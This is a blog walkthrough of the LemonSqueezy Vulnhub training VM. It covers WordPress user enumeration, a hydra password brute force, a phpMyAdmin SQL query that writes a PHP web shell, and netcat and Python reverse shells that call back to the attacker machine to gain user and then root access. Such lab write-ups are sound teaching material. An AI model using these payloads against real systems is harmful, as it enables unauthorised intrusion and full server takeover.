---
date: 2020-06-15 00:07:28
layout: post
title: "LemonSqueezy Vulnhub Walkthrough"
subtitle:
description: LemonSqueezy:1 is a boot2root VM from Vulnhub. This is rated easy and good for beginners.
image: /assets/img/uploads/lemonsqueezy/lemonsqueezy.jpg
optimized_image: /assets/img/uploads/lemonsqueezy/lemonsqueezy-optimized.jpg
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: lemonsqueezy, lemonsqueezy vulnhub, lemonsqueezy writeup, vulnhub, lemonsqueezy walkthrough, lemonsqueezy vulnhub walkthrough, infosec articles
---

Today we will be having a walkthrough of another boot2root machine called “LemonSqueezy:1”. This machine is rated easy and good for beginners. This includes enumerating Wordpress and PhpMyAdmin to get the user shell and then exploiting a cron job running on the machine to get root. I've added the machine to my hosts file. Let's dive in.

```r
root@kali:~# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
192.168.1.12    lemonsqueezy
```

## Initial Enumeration

I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```r
root@kali:~# nmap -sC -sV -oA nmap/LemonSqueezy lemonsqueezy

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:12 IST
Nmap scan report for lemonsqueezy (192.168.1.12)
Host is up (0.00036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:72:86:BF (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

The port80 was open which displayed the Default Apache2 Page. Next, I used Gobuster to search for hidden directories and found two directories named <b>wordpress</b> and <b>phpmyadmin.</b>

```r
root@kali:~# gobuster dir -u lemonsqueezy -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://lemonsqueezy
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/15 16:11:49 Starting gobuster
===============================================================
/wordpress (Status: 301)
/manual (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/15 16:13:08 Finished
===============================================================
```

I decided to enumerate the wordpress directory first which was running a default wordpress theme.

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/wordpress.png">
</center>

I ran wpscan to enumerate for wordpress users and found two users named <b>lemon</b> and <b>orange.</b>

```r
root@kali:~# wpscan --url http://lemonsqueezy/wordpress/ --enumerate u

...

[i] User(s) Identified:

[+] lemon
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://lemonsqueezy/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] orange
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

...
```

The next goal was to log into wordpress, I tried some random passwords with the usernames but none of them worked. So the next option was to brute force the login. For this, I set up a burp proxy and captured the login request.

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/burp.png">
</center>

Then I used hydra to brute force the login credentials for user <b>orange</b> and found the password <b>ginger.</b>
```r
root@kali:~# hydra lemonsqueezy http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l orange -P /usr/share/wordlists/rockyou.txt -t 10 -w 30    

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-15 16:19:50
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking http-post-form://lemonsqueezy:80/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:incorrect
[80][http-post-form] host: lemonsqueezy   login: orange   password: ginger
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-15 16:20:05
```

After logging in as user orange, I found a post draft named "Keep this Safe" which contained some text, most probably a password.  

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/wp-password.png">
</center>


## User Shell

After some guesses, I found that this password can be used to login into the <b>phpmyadmin</b> page with the username <b>orange</b> and password <b>nOt1n@wOrdl1st!</b> 


<center><br>
<img src="/assets/img/uploads/lemonsqueezy/phpmyadmin.png">
</center>

Then, I went to the SQL tab, where we can execute SQL queries on localhost and created a simple php backdoor.

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor.php"
```
<center><br>
<img src="/assets/img/uploads/lemonsqueezy/php-backdoor.png">
</center>

The command executed without any errors. Then I went to the location, where the backdoor was created and executed the <b>id</b> command.

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/backdoor-id.png">
</center>

That was a success! Now it was time to get a netcat reverse shell back to the host machine and read our first flag!

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/rev-shell.png">
</center>

```r
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...connect to [192.168.1.11] from (UNKNOWN) [192.168.1.12] 50462  

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@lemonsqueezy:/var/www/html/wordpress$ cd /var/www/
cd /var/www

www-data@lemonsqueezy:/var/www$ cat user.txt
cat user.txt
TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH
www-data@lemonsqueezy:/var/www$
```

## Root Shell

For further enumeration, I uploaded the <a href="https://github.com/DominicBreuker/pspy">pspy script</a> to look for running processes. To transfer files, I started a <b>python http server</b> on my host machine, and then downloaded it using <b>wget</b> on the target machine.

```r
root@kali:~# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```r
www-data@lemonsqueezy:/home/orange$ cd /dev/shm
cd /dev/shm
www-data@lemonsqueezy:/dev/shm$ wget http://192.168.1.11:8000/pspy64
wget http://192.168.1.11:8000/pspy64
--2020-06-15 20:31:41--  http://192.168.1.11:8000/pspy64
Connecting to 192.168.1.11:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.94M  --.-KB/s    in 0.04s   

2020-06-15 20:31:41 (82.9 MB/s) - 'pspy64' saved [3078592/3078592]

www-data@lemonsqueezy:/dev/shm$ chmod +x pspy64      
chmod +x pspy64
```
Then I gave it executable permissions and after executing the script, I found a logrotate process running as root which repeats itself after some interval.

<center><br>
<img src="/assets/img/uploads/lemonsqueezy/pspy.png">
</center>


I went to <b>/etc/logrotate.d/</b> directory and found that the <b>logrotate</b> is a python script which is world writable.

```r
www-data@lemonsqueezy:/dev/shm$ cd /etc/logrotate.d/
cd /etc/logrotate.d/
www-data@lemonsqueezy:/etc/logrotate.d$ ls -lah
ls -lah
total 56K
drwxr-xr-x   2 root root 4.0K Apr 26 14:45 .
drwxr-xr-x 122 root root  12K Jun 15 20:07 ..
-rw-r--r--   1 root root  433 Oct 14  2019 apache2
-rw-r--r--   1 root root  173 Sep 14  2017 apt
-rw-r--r--   1 root root  107 Sep 21  2016 dbconfig-common
-rw-r--r--   1 root root  232 Jun 10  2015 dpkg
-rwxrwxrwx   1 root root  101 Apr 26 14:45 logrotate
-rw-r--r--   1 root root  802 Jan 29 16:49 mysql-server
-rw-r--r--   1 root root   94 Feb 21 07:38 ppp
-rw-r--r--   1 root root  515 Jan 19  2017 rsyslog
-rw-r--r--   1 root root  513 Aug  2  2017 speech-dispatcher
-rw-r--r--   1 root root  235 Dec 11  2016 unattended-upgrades

www-data@lemonsqueezy:/etc/logrotate.d$ file logrotate
file logrotate
logrotate: Python script, ASCII text executable
www-data@lemonsqueezy:/etc/logrotate.d$
```

I replaced the contents of the <b>logrotate</b> with a python reverse shell and opened a listener on another terminal.

```r
www-data@lemonsqueezy:/etc/logrotate.d$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.11",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> logrotate
```

Within a few minutes, a reverse shell popped in and I was able to read the final flag!

```r
root@kali:~# nc -lvnp 9000
listening on [any] 9000 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.12] 58776
root@lemonsqueezy:~# cat root.txt
cat root.txt
NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
```

<p align="justify"> That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future! If you have any queries, you can contact me <a href="/contact">here.</a> </p>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/ecaterinar">Ekaterina Rogova .</a>

